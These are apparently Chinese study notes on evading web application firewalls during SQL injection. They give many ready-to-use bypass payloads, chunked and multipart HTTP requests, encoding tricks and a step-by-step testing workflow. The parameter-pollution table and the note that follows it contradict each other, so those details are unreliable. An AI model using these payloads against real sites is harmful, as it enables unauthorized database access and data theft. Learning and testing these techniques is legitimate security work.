# SQL绕WAF



## WAF

web应用防火墙,针对HTTP/HTTPS 的安全策略来专门 为Web应用程序提供检测和保护的网络安全产品,WAF可以增大攻击者的攻击难度和攻击成本



### WAF分类

1. 硬件WAF
   - 启明星辰(天清),绿盟(绿盟WAF),长亭(雷池),奇安信(网神),知道创宇(创宇盾)
2. 软件WAF
   - 安全狗,云锁,360主机卫士,ModSecurity,宝塔
3. 云端WAF
   - 阿里云盾,创宇盾,ClodeFlare

![image-20260715103505109](https://exllo-lv-github-notes-picture-1452130078.cos.ap-nanjing.myqcloud.com/img/image-20260715103505109.png)

### 快速识别WAF

```
sqlmap -u "http://target.com?id=1" --identify-waf
```

- 用SQLmap识别

- 手动看响应头

- 阿里云: 响应头有 "X-Security-Token"

- 安全狗: 拦截页面有 "安全狗" 字样

- CloudFlare: 有 "cf-ray" 头

  

### 绕WAF

1. **核心思路**

绕WAF的本质是**利用其解析HTTP协议、检测规则和性能上的局限性**，使攻击载荷（Payload）在到达服务器端时被还原成有效的SQL语句，从而完成注入。核心原则是**打组合拳**：单一技巧成功率有限，将多种绕过技术（如编码+注释+污染）结合使用，能极大提高绕过概率。

2. **四大绕过层面**

| 绕过层面        | 核心技术点        | 关键技巧                                                     |
| --------------- | ----------------- | ------------------------------------------------------------ |
| **架构层**      | 绕过网络架构限制  | • **寻找真实IP**：针对云WAF，通过DNS历史记录、子域名、C段扫描等方式找源站IP，修改本地hosts绕过。 <br />• **同网段/边界漏洞**：利用SSRF等漏洞从服务器内部发起请求，可能不经过WAF。 <br />• **HTTP/HTTPS服务不一致**：若HTTPS有防护而HTTP未强制跳转，直接访问HTTP入口。 |
| **协议层**      | 利用HTTP协议特性  | • **分块传输** (Chunked Transfer-Encoding)：使用`Transfer-Encoding: chunked`，将Payload分块发送，可配合注释、延时（利用`sleep`参数）绕过。<br/>• **参数污染** (HPP/HPF)：对同一参数多次赋值（如`?id=1&id=2`），利用WAF与后端解析差异，将注入语句放在WAF忽略的参数中。<br/>• **协议覆盖/文件格式**：修改`Content-Type`为`multipart/form-data`，或将GET请求改为POST，绕过仅检测特定格式的WAF。<br/>• **Pipeline请求**：复用TCP连接，发送多个请求，使WAF检测失效。 |
| **规则层**      | 对抗WAF的检测规则 | • **注释符滥用**： - 普通注释：`/**/`, `#`, `-- -` - 内联注释：`/*!50000UnIOn*/` (仅MySQL执行) - 利用注释拆分关键字：`UNI/**/ON` <br />• **编码与混淆**： - URL双重编码：`%2527` - Unicode编码：`%u0027`, `%c0%a7` - 十六进制：`0x61646D696E` <br />• **等价替换**： - 函数：`substr()` ↔ `mid()`，`ascii()` ↔ `hex()`，`benchmark()` 替代 `sleep()` - 符号：`and` ↔ `&&`，`or` ↔ `||`，`=` ↔ `like`/`rlike` <br />• **关键字变形**：大小写混合、双写关键字（`selselectect`）。 <br />• **特殊字符/空白符**：利用`%0a`、`%a0`、反引号```、`+`、`-`等替代空格。 |
| **资源/性能层** | 耗尽WAF处理能力   | • **缓冲区溢出**：构造超长Payload（如`0xA*1000`），利用C语言编写的WAF的缓冲区溢出漏洞使其崩溃。 <br />• **垃圾数据填充**：发送大量无用数据，使WAF因检测性能限制而跳过对注入语句的检查。 |



#### 架构层常用手段

1. **找真实IP**
   - 查DNS历史记录
   - 子域名爆破,有些子域名没走WAF
   - C段扫描,找同网段的其他服务
   - 证书透明度日志里找IP
   - 邮件服务器,FTP服务器的IP,经常跟Web在一起
2. **HTTP/HTTPS服务不一致**
   - 很多站HTTPS有WAF,HTTP没做强制跳转
3. **SSRF内网绕过**
   - 如果目标站存在SSRF漏洞,用它当跳板访问内网的其他服务,内网流量通常不经过WAF.
4. **CDN节点绕过**
   - 有些CDN节点只缓存静态资源,动态请求直接回源,不经过WAF检测。

#### 协议层常用手段

1. **分块传输编码**

   - HTTP/1.1允许把请求体分成多个块发送,WAF可能只检查第一块或者解析出错就放行了。

   > [!NOTE]
   >
   > **Burp实操步骤**
   >
   > 1. 在Repeater里把POST请求的Content-Length删掉
   > 2. 添加头: Transfer-Encoding: chunked
   > 3. 把请求体改成分块格式
   >
   > ```http
   > POST /sqli.php HTTP/1.1
   > Host: target.com
   > Transfer-Encoding: chunked
   > Content-Type: application/x-www-form-urlencoded
   > 
   > 4
   > id=1
   > b
   >  union sel
   > 7
   > ect use
   > 7
   > r()-- -
   > 0
   > ```
   >
   > 关键点:
   > - 每块开头是十六进制的长度
   > - 长度算的是该块内容的字节数（含空格！）
   > - 最后用0结尾，后面跟两个换行
   > - 可以把关键字,比如Union拆到不同块里

2. **HTTP参数污染**

   - **核心**:同一个参数出现多次,WAF和后端解析结果不一,例如

   | web服务器     | ?id=1&id=2的解析结果 |
   | ------------- | -------------------- |
   | Apache/Tomcat | 取最后一个:2         |
   | IIS/ASP.NET   | 取所有拼接值:1,2     |
   | Nginx         | 取第一个:2           |
   | PHP           | 取最后一个:2         |

> [!NOTE]
>
> 假设WAF是Apache风格（取第一个），后端是Nginx（取最后一个）
> http://target.com/?id=1&id=2%20union%20select%201,2,3
> WAF检查id=1，认为是安全的
> 后端实际执行的是 id=2 union select 1,2,3

3. **修改Content-Type绕过**
   - WAF经常只检测`application/x-www-form-urlencoded`格式的POST数据。

```
#改成multipart/form-data格式
POST /sqli.php HTTP/1.1
Host: target.com
Content-Type: multipart/form-data; boundary=----test

------test
Content-Disposition: form-data; name="id"

1 union select 1,2,3
------test--
```



#### 规则层绕过

这是最核心的部分，也是需要大量积累的地方。我按类型整理，每个类型下面是我个人觉得最好用的姿势。

1. **注释**

   - 普通注释

     ```sql
     -- 空格（注意：--后面必须有空格或控制字符）
     --+ （+号在URL里被解析为空格）
     # （URL里要编码成%23）
     /**/ （最通用的，但很多WAF会检测）
     ```

   - 内联注释(MySQL)

     ```sql
     /*!union*/ select 1,2,3
     
     /*!50000union*/  -- 只有MySQL版本>=5.0才执行
     
     /*!union/*/*!select*/  -- 嵌套注释
     
     /*!12345union*/  -- 数字范围1000-50540都可
     ```

2. **编码绕过**

   - URL编码

     ```sql
     union = %75%6E%69%6F%6E
     select = %73%65%6C%65%63%74
     
     # 单字符编码绕过（WAF可能只解码一次）
     ? id=1 %75nion %73elect 1,2,3  -- 只编码首字母
     
     # 双重编码（针对WAF做了一次解码的）
     %2527  -> 解码一次是%27，再解码一次是'
     ```

   - Unicode编码 

     ```SQL
     单引号: %u0027, %u02b9, %u2032, %uff07, %c0%a7
     空格: %u0020, %uff00, %c0%20, %e0%80%a0
     左括号: %u0028, %uff08, %c0%28
     右括号: %u0029, %uff09, %c0%29
     
     # 宽字节注入（GBK编码下）
     id=%df%27 and 1=1-- -  -- \变成\xdf，宽字节逃逸转义
     ```

   - 十六进制编码(绕过引号)

     ```sql
     # table_name='users' 变成 0x7573657273
     union select 1,column_name from information_schema.columns 
     where table_name=0x7573657273
     
     # 整个查询语句编码（极端情况）
     ? id=1 and extractvalue(0x3C613E61646D696E3C2F613E,0x2f61)
     ```

   - ASCII编码(SQL Server/MySQL)

     ```sql
     CHAR(117)+CHAR(110)+CHAR(105)+CHAR(111)+CHAR(110)
     # 结果: union
     ```

3. **等价替换**

   - | 被过滤的         | 可以替换的                                  | 备注                            |
     | ---------------- | ------------------------------------------- | ------------------------------- |
     | `ascii()`        | `hex()`, `bin()`, `ord()`                   | `ord()`在MySQL里跟`ascii()`一样 |
     | `sleep()`        | `benchmark(10000000,1)`                     | 制造时间延迟                    |
     | `substr()`       | `mid()`, `substring()`, `left()`, `right()` | 四个随便换                      |
     | `group_concat()` | `concat_ws(',', ...)`                       | 第一个参数是分隔符              |
     | `user()`         | `@@user`                                    | 系统变量                        |
     | `version()`      | `@@version`                                 | 同上                            |
     | `database()`     | `schema()`                                  | MySQL里的别名                   |
     | `database()`     | `schema()`                                  | MySQL里的别名                   |

   - 符号等价

     ```sql
     逻辑运算符:
     and -> && 或 & （注意&&在URL里要编码）
     or -> || 或 |
     not -> !
     xor -> | 或 ^
     比较运算符:
     = -> like, rlike, regexp, <>
     > -> greatest() 或 least() 配合绕过
     < -> 同上
     != -> <>
     空格替代
     1. /**/          -- 最通用
     2. %0a           -- 换行符（很多WAF不拦截）
     3. %0b           -- 垂直制表符
     4. %0c           -- 换页符
     5. %0d           -- 回车符
     6. %09           -- 制表符
     7. %a0           -- 不间断空格（MySQL解析为空格）
     8. 反引号 `      -- 包裹表名/列名时可用
     9. 括号 ()        -- 某些场景下可以包围子查询
     10. 两个空格      -- 简单但有效
     ```

4. 关键字变形

   - 大小写混合

     ```sql
     UnIoN SeLeCt 1,2,3
     uNiOn AlL sElEcT 1,2,3
     ```

   - 双写

     ```sql
     ununionion  -> 替换掉一个union，还剩一个
     selselectect -> 替换掉一个select，还剩一个
     uniunionon -> 替换一次变union，替换两次还是union
     
     # 组合使用
     ? id=1 ununionion selselectect 1,2,3
     ```

   - 插入干扰字符

     ```sql
     # 插入感叹号、百分号等
     %S%E%L%E%C%T
     u!n!i!o!n
     
     # 利用MySQL的"!"注释（注意不是所有版本都支持）
     select 1!union select 2
     ```

   #### 资源/性能层绕过

1. **缓冲区溢出**

   - 有些WAF是C语言写的，没做好缓冲区保护。

     ```sql
     ?id=1 and (select 1)=(Select 0xA*5000)+UnIoN+SeLeCT+1,2,3,4...
     
     # 0xA*5000 表示 0xA后面跟5000个A
     # 有些WAF处理超长字符串时会崩溃或跳过检测
     ```

2. **垃圾数据填充**

   - WAF为了性能，可能只检测数据包的前N个字节或前N个参数。

   ```sql
   # 构造大量无用参数
   http://target.com/?a=AAAA...（5000个A）...AAAA&id=1 union select 1,2,3
   
   # 或者把垃圾数据放在Cookie里
   Cookie: junk=AAAA...（很多A）...AAAA; PHPSESSID=xxx
   
   # 或者放在POST大文件里
   -- 上传一个超大文件，在文件末尾藏SQL语句
   ```

   

## 一些测试流程经验

1. **先探测**：扔一个`'`或者`and 1=1`，看WAF拦截什么关键字
2. **定位注入点**：确定是数字型、字符型还是搜索型
3. **列类型**：用`order by`或`union select null`判断列数（绕过空格和逗号时用`from...for`或`join`）
4. **组合绕过**：根据拦截情况，把编码、注释、等价替换组合起来
5. **拿数据**：用`database()`、`user()`、`version()`等函数获取基本信息
6. **表名列名**：查`information_schema`，注意把表名十六进制编码